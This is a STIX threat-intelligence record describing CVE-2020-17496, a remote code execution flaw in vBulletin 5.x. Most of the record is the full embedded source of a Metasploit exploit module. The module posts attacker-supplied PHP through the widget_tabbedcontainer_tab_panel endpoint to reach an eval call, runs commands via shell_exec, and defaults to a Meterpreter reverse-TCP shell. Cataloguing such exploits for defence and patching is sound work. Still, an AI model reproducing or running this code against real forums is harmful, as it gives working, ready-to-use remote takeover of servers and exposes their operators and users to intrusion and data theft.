{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5f6313ff-3a4b-4276-ae1e-04f51194df13",
    "created": "2024-08-14T17:10:50.293616Z",
    "modified": "2024-08-14T17:10:50.293619Z",
    "name": "vBulletin 5.x /ajax/render/widget_tabbedcontainer_tab_panel PHP remote code execution.",
    "description": " This module exploits a logic bug within the template rendering code in vBulletin 5.x. The module uses the vBulletin template rendering functionality to render the 'widget_tabbedcontainer_tab_panel' template while also providing the 'widget_php' argument. This causes the former template to load the latter bypassing filters originally put in place",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/vbulletin_widget_template_rce.rb",
            "external_id": "vbulletin_widget_template_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://blog.exploitee.rs/2020/exploiting-vbulletin-a-tale-of-patch-fail/"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-17496"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  HttpFingerprint = { method: 'GET', uri: '/', pattern: [/vBulletin.version = '5.+'/] }.freeze\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'vBulletin 5.x /ajax/render/widget_tabbedcontainer_tab_panel PHP remote code execution.',\n        'Description' => %q{\n          This module exploits a logic bug within the template rendering code in vBulletin 5.x.\n          The module uses the vBulletin template rendering functionality to render the\n          'widget_tabbedcontainer_tab_panel' template while also providing the 'widget_php' argument.\n          This causes the former template to load the latter bypassing filters originally put in place\n          to address 'CVE-2019-16759'. This also allows the exploit to reach an eval call with user input\n          allowing the module to achieve PHP remote code execution on the target. This module has been\n          tested successfully on vBulletin version 5.6.2 on Ubuntu Linux.\n        },\n        'Author' => [\n          'Zenofex <zenofex[at]exploitee.rs>' # (@zenofex) PoC and Metasploit module\n        ],\n        'References' => [\n          ['URL', 'https://blog.exploitee.rs/2020/exploiting-vbulletin-a-tale-of-patch-fail/'],\n          ['CVE', '2020-17496']\n        ],\n        'DisclosureDate' => '2020-08-09',\n        'License' => MSF_LICENSE,\n        'Platform' => ['php', 'unix', 'windows'],\n        'Arch' => [ARCH_CMD, ARCH_PHP],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Meterpreter (PHP In-Memory)',\n            {\n              'Platform' => 'php',\n              'Arch' => [ARCH_PHP],\n              'Type' => :php_memory,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'php/meterpreter/reverse_tcp',\n                'DisablePayloadHandler' => false\n              }\n            }\n          ],\n          [\n            'Unix (CMD In-Memory)',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/generic',\n                'DisablePayloadHandler' => true\n              }\n            }\n          ],\n          [\n            'Windows (CMD In-Memory)',\n            {\n              'Platform' => 'windows',\n              'Arch' => ARCH_CMD,\n              'Type' => :windows_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/windows/generic',\n                'DisablePayloadHandler' => true\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'The URI of the vBulletin base path', '/']),\n      OptEnum.new('PHP_CMD', [true, 'Specify the PHP function in which you want to execute the payload.', 'shell_exec', ['shell_exec', 'exec']])\n    ])\n  end\n\n  def cmd_payload(command)\n    \"echo #{datastore['PHP_CMD']}(base64_decode('#{Rex::Text.encode_base64(command)}')); exit;\"\n  end\n\n  def execute_command(command)\n    response = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/ajax/render/widget_tabbedcontainer_tab_panel'),\n      'encode_params' => true,\n      'vars_post' => {\n        'subWidgets[0][template]' => 'widget_php',\n        'subWidgets[0][config][code]' => command\n      }\n    })\n    if response && response.body\n      return response\n    end\n\n    false\n  end\n\n  def check\n    rand_str = Rex::Text.rand_text_alpha(8)\n    received = execute_command(cmd_payload(\"echo #{rand_str}\"))\n    if received && received.body.include?(rand_str)\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    print_status(\"Sending #{datastore['PAYLOAD']} command payload\")\n    case target['Type']\n    when :unix_cmd, :windows_cmd\n      cmd = cmd_payload(payload.encoded)\n      vprint_status(\"Generated command payload: #{cmd}\")\n\n      received = execute_command(cmd)\n      if received && (datastore['PAYLOAD'] == \"cmd/#{target['Platform']}/generic\")\n        print_warning('Dumping command output in body response')\n        if received.body.empty?\n          print_error('Empty response, no command output')\n          return\n        end\n        print_line(received.body.to_s)\n      end\n\n    when :php_memory\n      vprint_status(\"Generated command payload: #{payload.encoded}\")\n      execute_command(payload.encoded)\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2020-08-09",
    "x_mitre_platforms": [
        "windows'"
    ]
}